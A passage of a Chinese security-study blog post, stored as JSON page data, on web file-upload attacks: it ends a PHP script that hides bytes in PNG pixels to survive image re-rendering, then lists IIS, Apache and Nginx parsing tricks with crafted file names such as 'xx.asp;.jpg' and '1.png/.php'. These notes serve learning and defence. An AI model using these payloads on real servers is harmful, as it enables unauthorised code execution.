#BABED8\"> </span><span style=\"color: #F78C6C\">0xae</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xcc</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x5a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x01</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xdc</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x5a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x01</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xdc</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xa3</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x9f</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x67</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xa5</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xbe</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x5f</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x76</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x74</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x5a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x4c</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0xa1</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x3f</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x7a</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xbf</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x30</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x6b</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x88</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x2d</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x60</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x65</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x7d</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x52</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x9d</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xad</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x88</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0xa1</span><span style=\"color: #89DDFF\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #F78C6C\">0x66</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x44</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x50</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0x33</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">img </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">imagecreatetruecolor</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #F78C6C\">32</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">32</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">y </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">y </span><span style=\"color: #89DDFF\">&lt;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">sizeof</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">);</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">y </span><span style=\"color: #89DDFF\">+=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">3</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">r </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">[$</span><span style=\"color: #BABED8\">y</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">g </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">[$</span><span style=\"color: #BABED8\">y</span><span style=\"color: #89DDFF\">+</span><span style=\"color: #F78C6C\">1</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">b </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">p</span><span style=\"color: #89DDFF\">[$</span><span style=\"color: #BABED8\">y</span><span style=\"color: #89DDFF\">+</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #89DDFF\">];</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">color </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">imagecolorallocate</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">img</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">r</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">g</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">b</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #82AAFF\">imagesetpixel</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">img</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">round</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">y </span><span style=\"color: #89DDFF\">/</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">3</span><span style=\"color: #89DDFF\">),</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">$</span><span style=\"color: #BABED8\">color</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">imagepng</span><span style=\"color: #89DDFF\">($</span><span style=\"color: #BABED8\">img</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">./1.png</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">?&gt;</span></span></code></pre></div></li>\n</ul>\n<h3 id=\"中间件解析漏洞\"><a href=\"#中间件解析漏洞\" class=\"headerlink\" title=\"中间件解析漏洞\"></a>中间件解析漏洞</h3><p><a href=\"https://blog.csdn.net/m0_64378913/article/details/125067293\">中间件文件解析漏洞概述及实例——Apache、IIS和Nginx_中间件解析漏洞-CSDN博客</a></p>\n<h4 id=\"IIS-5-x-6-x\"><a href=\"#IIS-5-x-6-x\" class=\"headerlink\" title=\"IIS 5.x-6.x\"></a>IIS 5.x-6.x</h4><ul>\n<li>文件解析: iis6.0下，<strong>分号后面的不被解析</strong>, <code>xx.asp;.jpg</code>被解析为asp</li>\n<li>目录解析: 名字为<code>.asp</code>、<code>.asa</code>的<strong>文件夹</strong>, 其下任何扩展名的文件都被IIS当做<strong>asp文件</strong>来解析并执行</li>\n</ul>\n<h4 id=\"IIS7-5\"><a href=\"#IIS7-5\" class=\"headerlink\" title=\"IIS7.5\"></a>IIS7.5</h4><ul>\n<li>与nginx的类似</li>\n</ul>\n<h4 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h4><h5 id=\"换行解析\"><a href=\"#换行解析\" class=\"headerlink\" title=\"换行解析\"></a>换行解析</h5><ul>\n<li><p>利用前提: 黑名单验证(不能上传php jsp等) version: 2.4.0~2.4.29</p>\n</li>\n<li><p>在解析PHP时，<code>1.php%0A</code>将被按照PHP后缀进行解析(%0a为换行)</p>\n</li>\n</ul>\n<h5 id=\"多后缀解析\"><a href=\"#多后缀解析\" class=\"headerlink\" title=\"多后缀解析\"></a>多后缀解析</h5><ul>\n<li><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令</p>\n</li>\n<li><p>如果添加了如下配置, <code>1.php.png</code>可以当成php解析</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">AddHandler application/x-httpd-php .php</span></span></code></pre></div></li>\n</ul>\n<h4 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h4><h5 id=\"文件名逻辑漏洞\"><a href=\"#文件名逻辑漏洞\" class=\"headerlink\" title=\"文件名逻辑漏洞\"></a>文件名逻辑漏洞</h5><ul>\n<li><code>1.gif[0x20][0x00].php</code>Nginx却错误地认为请求的文件是<code>1.gif[0x20]</code></li>\n</ul>\n<h5 id=\"解析漏洞\"><a href=\"#解析漏洞\" class=\"headerlink\" title=\"解析漏洞\"></a>解析漏洞</h5><ul>\n<li>用户配置不当造成漏洞</li>\n<li><code>http://ip/1.png</code>访问图片, <code>http://ip/1.png/.php</code>解析图片为php</li>\n</ul>\n<h3 id=\"编辑器漏洞\"><a href=\"#编辑器漏洞\" class=\"headerlink\" title=\"编辑器漏洞\"></a>编辑器漏洞</h3><ul>\n<li><a href=\"https://blog.csdn.net/weixin_45329947/article/details/122712440\">Ueditor、FCKeditor、Kindeditor编辑器漏洞_kindeditor漏洞-CSDN博客</a></li>\n</ul>\n","feature":true,"text":"大型靶场Vulhub - Docker-Compose file for vulnerability environment SQL注入-补充内容ACCESS注...","permalink":"/post/WEB攻防-通用漏洞","photos":[],"count_time":{"symbolsCount":"5.1k","symbolsTime":"5 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5-%E8%A1%A5%E5%85%85%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">SQL注入-补充内容</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ACCESS%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">ACCESS注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">偏移注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">使用场景</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">注入原理</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#MYSQL\"><span class=\"toc-text\">MYSQL</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sqlmap\"><span class=\"toc-text\">sqlmap</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#sqlmap%E8%81%94%E5%8A%A8msf\"><span class=\"toc-text\">sqlmap联动msf</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">脚本使用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8E%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">(基于堆叠注入)绕过select过滤</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">二次注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">过程</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B\"><span class=\"toc-text\">案例</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DNS%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">DNS注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">文件上传</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">解析执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#user-ini\"><span class=\"toc-text\">.user.ini</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#htaccess\"><span class=\"toc-text\">.htaccess</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-1\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6\"><span class=\"toc-text\">条件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%A4%BA%E4%BE%8B\"><span class=\"toc-text\">示例</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">过滤绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">绕过&lt;?php?&gt;过滤</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BC%95%E5%8F%B7-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">利用反引号&#96;&#96;绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97\"><span class=\"toc-text\">包含日志</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9F%AD%E7%BD%91%E5%9D%80%E7%BB%95%E8%BF%87%E2%80%9D-%E2%80%9D\"><span class=\"toc-text\">短网址绕过”.”</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">文件头检测</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%AF%E5%9C%A8%E6%96%87%E4%BB%B6%E5%A4%B4%E9%83%A8%E6%B7%BB%E5%8A%A0%E8%AF%A5%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B-%E4%BE%8B%E5%A6%82-user-ini-GIF89Aauto-prepend-file-test-png\"><span class=\"toc-text\">可在文件头部添加该特征绕过检测, 例如&#96;&#96;&#96;user ini:GIF89Aauto_prepend_file&#x3D;test.png</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89\"><span class=\"toc-text\">条件竞争</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">漏洞原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">利用</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93\"><span class=\"toc-text\">二次渲染</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">二次渲染原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%AF%86%E5%88%AB\"><span class=\"toc-text\">识别</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">绕过</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">中间件解析漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#IIS-5-x-6-x\"><span class=\"toc-text\">IIS 5.x-6.x</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#IIS7-5\"><span class=\"toc-text\">IIS7.5</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#apache\"><span class=\"toc-text\">apache</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">换行解析</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">多后缀解析</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Nginx\"><span class=\"toc-text\">Nginx</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">文件名逻辑漏洞</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">解析漏洞</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">编辑器漏洞</span></a></li></ol></li></ol>","author":{"name":"Myprefer","slug":"blog-author","avatar":"https://i0.imgs.ovh/2024/01/23/x3DH5.jpeg","link":"https://myprefer.github.io/","description":"An ordinary learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{},"next_post":{"title":"(转)知识点合集","uid":"7877f5fab13c4afbf71848ed5da71412","slug":"转-知识点合集","date":"2024-03-05T15:07:07.000Z","updated":"2024-03-11T03:21:52.691Z","comments":true,"path":"api/articles/转-知识点合集.json","keywords":null,"cover":[],"text":" Author: Evi1cg Blog: https://evi1cg.github.io 信息搜集开源情报信息收集（OSINT）github Github_...","permalink":"/post/转-知识点合集","photos":[],"count_time":{"symbolsCount":"39k","symbolsTime":"35 mins."},"categories":[],"tags":[],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://i0.imgs.ovh/2024/01/23/x3DH5.jpeg","link":"https://myprefer.github.io/","description":"An ordinary learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}